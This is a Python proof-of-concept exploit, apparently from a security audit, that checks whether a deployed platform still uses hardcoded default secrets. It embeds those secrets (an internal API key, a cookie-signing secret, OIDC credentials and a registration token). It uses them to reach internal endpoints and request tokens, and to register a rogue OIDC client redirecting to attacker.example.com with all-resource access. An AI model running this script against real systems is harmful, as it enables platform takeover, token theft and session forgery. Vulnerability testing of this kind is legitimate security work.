#!/usr/bin/env python3
"""
PoC #1 — Hardcoded Default Secrets: Full Platform Takeover
CRITICAL: Tests if the target uses default secrets from source code.

Targets:
  - SESSION_COOKIES_SIGN_SECRET (cookie forgery)
  - INTERNAL_API_KEY (internal API access)
  - OIDC client credentials (token theft)
  - OIDC client registration token (rogue client creation)

Usage: python3 poc_01_hardcoded_secrets.py --target https://dev.example.com
"""

import argparse
import requests
import json
import hmac
import hashlib
import base64
import urllib3
urllib3.disable_warnings()

# Default secrets from source code
DEFAULTS = {
    "INTERNAL_API_KEY": "#pZFT>2.g9x8p9D",
    "SESSION_COOKIES_SIGN_SECRET": ",s6<Mt3=dE[7a#k{)4H)C4%",
    "OIDC_STUDIO_CLIENT_ID": "local-client-id",
    "OIDC_STUDIO_CLIENT_SECRET": "some-secret",
    "OIDC_CLIENT_REGISTRATION_TOKEN": "oidc-client-registration",
}


def test_internal_api_key(base_url):
    """Test if default INTERNAL_API_KEY grants access to internal endpoints."""
    print("\n[*] Testing INTERNAL_API_KEY...")
    headers = {"x-prismeai-api-key": DEFAULTS["INTERNAL_API_KEY"]}

    # /v2/readiness requires isInternallyAuthenticated
    url = f"{base_url}/v2/readiness"
    try:
        r = requests.get(url, headers=headers, verify=False, timeout=10)
        if r.status_code == 200:
            print(f"  [CRITICAL] Default INTERNAL_API_KEY accepted! Status: {r.status_code}")
            print(f"  Response: {r.text[:500]}")
            return True
        else:
            print(f"  [OK] Rejected with status {r.status_code}")
            return False
    except Exception as e:
        print(f"  [ERROR] {e}")
        return False


def test_oidc_client_registration(base_url):
    """Test if default OIDC registration token allows registering rogue clients."""
    print("\n[*] Testing OIDC dynamic client registration...")

    url = f"{base_url}/oidc/reg"
    headers = {
        "Authorization": f"Bearer {DEFAULTS['OIDC_CLIENT_REGISTRATION_TOKEN']}",
        "Content-Type": "application/json",
    }
    # Register a rogue client with internal flags
    payload = {
        "client_name": "security-audit-poc",
        "redirect_uris": ["https://attacker.example.com/callback"],
        "grant_types": ["authorization_code", "refresh_token"],
        "response_types": ["code"],
        "token_endpoint_auth_method": "none",
        # Abuse empty extraClientMetadataValidator
        "isInternalClient": True,
        "allowedResources": ["*"],
    }

    try:
        r = requests.post(url, headers=headers, json=payload, verify=False, timeout=10)
        if r.status_code in (200, 201):
            data = r.json()
            print(f"  [CRITICAL] Rogue OIDC client registered!")
            print(f"  Client ID: {data.get('client_id')}")
            print(f"  Client Secret: {data.get('client_secret', 'none')}")
            print(f"  isInternalClient accepted: {data.get('isInternalClient')}")
            return True
        else:
            print(f"  [OK] Registration rejected: {r.status_code}")
            print(f"  Response: {r.text[:300]}")
            return False
    except Exception as e:
        print(f"  [ERROR] {e}")
        return False


def test_oidc_known_client(base_url):
    """Test if default OIDC studio client credentials work."""
    print("\n[*] Testing default OIDC studio client credentials...")

    # Try to get a token using client_credentials or discover the OIDC config
    url = f"{base_url}/oidc/.well-known/openid-configuration"
    try:
        r = requests.get(url, verify=False, timeout=10)
        if r.status_code == 200:
            config = r.json()
            token_endpoint = config.get("token_endpoint", "")
            print(f"  [INFO] OIDC discovery successful. Token endpoint: {token_endpoint}")

            # Try token endpoint with default client (token_endpoint_auth_method: none)
            token_data = {
                "grant_type": "client_credentials",
                "client_id": DEFAULTS["OIDC_STUDIO_CLIENT_ID"],
                "scope": "openid",
            }
            r2 = requests.post(token_endpoint, data=token_data, verify=False, timeout=10)
            if r2.status_code == 200:
                print(f"  [CRITICAL] Default client credentials accepted!")
                print(f"  Token response: {r2.text[:500]}")
                return True
            else:
                print(f"  [INFO] Token request status: {r2.status_code} (may not support client_credentials)")
        else:
            print(f"  [INFO] OIDC discovery returned {r.status_code}")
    except Exception as e:
        print(f"  [ERROR] {e}")
    return False


def test_session_cookie_signing(base_url):
    """Test if session cookies use the default signing secret."""
    print("\n[*] Testing session cookie signing secret...")
    print("  [INFO] This test requires obtaining a valid session cookie first.")
    print("  [INFO] If the default secret is used, cookies can be forged with:")
    print(f"  [INFO] Secret: {DEFAULTS['SESSION_COOKIES_SIGN_SECRET']}")

    # Try to get a session cookie to check the signature format
    try:
        r = requests.get(f"{base_url}/oidc/.well-known/openid-configuration",
                         verify=False, timeout=10)
        cookies = r.cookies
        for cookie in cookies:
            if 'sig' in cookie.name.lower() or 'session' in cookie.name.lower():
                print(f"  [INFO] Found cookie: {cookie.name}={cookie.value[:50]}...")
                print("  [INFO] Manual verification needed: decode and verify HMAC with default secret")
        return None  # Manual verification needed
    except Exception as e:
        print(f"  [ERROR] {e}")
        return False


def main():
    parser = argparse.ArgumentParser(description="PoC #1: Hardcoded Default Secrets")
    parser.add_argument("--target", required=True, help="Base URL (e.g., https://dev.prisme.example.com)")
    args = parser.parse_args()

    base = args.target.rstrip("/")
    print(f"[*] Target: {base}")
    print("=" * 60)

    results = {}
    results["internal_api_key"] = test_internal_api_key(base)
    results["oidc_registration"] = test_oidc_client_registration(base)
    results["oidc_default_client"] = test_oidc_known_client(base)
    results["session_signing"] = test_session_cookie_signing(base)

    print("\n" + "=" * 60)
    print("[*] SUMMARY")
    for k, v in results.items():
        status = "VULNERABLE" if v else ("MANUAL CHECK" if v is None else "OK")
        print(f"  {k}: {status}")


if __name__ == "__main__":
    main()
